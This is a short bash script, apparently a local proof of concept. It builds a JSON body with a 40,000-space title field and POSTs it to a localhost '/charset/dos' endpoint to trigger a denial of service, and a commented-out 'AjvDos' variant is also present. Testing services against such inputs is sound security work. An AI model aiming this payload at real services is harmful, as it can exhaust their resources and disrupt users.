#!/bin/bash

set +x

generate() {
    echo "Running generation... Hold tight."
    start=`date +%s`

    LENGTH=$1
    CHAR=$2
    RESULT=""
    for ((i = 0; i <= $LENGTH; i++))
    do
        RESULT=$RESULT$CHAR
    done
    jo -p title="${RESULT}" > data.json

    end=`date +%s`
    runtime=$((end-start))
    echo "All done!"
    echo "Took: ${runtime}s"
}

# runAjvDos() {
    #generate 10000 "" 
# }

runCharsetDos() {
    generate 40000 " "
    curl -d "@data.json" -H "Content-Type: application/json" -X POST http://localhost:3000/charset/dos
}

runCharsetDos
